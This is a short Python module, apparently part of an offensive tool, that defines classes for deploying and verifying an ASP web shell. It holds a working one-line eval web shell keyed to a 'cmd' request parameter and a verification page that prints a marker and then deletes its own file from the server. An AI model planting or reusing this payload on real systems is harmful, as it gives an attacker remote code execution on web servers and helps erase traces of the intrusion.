#author: fyth

from webshell import *


class AspShell(Webshell):
    _password = 'cmd'
    _content = '<%eval request("{0}")%>'
    _check_statement = 'Response.Write(Replace("202cTEST4b70","TEST",' \
                       '"b962ac59075b964b07152d23"))'
    _keyword = '202cb962ac59075b964b07152d234b70'


class AspVerify(VerifyShell):
    _content = '<%\n' \
               'Response.Write(Replace("202cTEST4b70","TEST",' \
               '"b962ac59075b964b07152d23"))\n' \
               'CreateObject("Scripting.FileSystemObject").' \
               'DeleteFile(Request.ServerVariables("Path_Translated"))\n' \
               '%>'
    _keyword = '202cb962ac59075b964b07152d234b70'

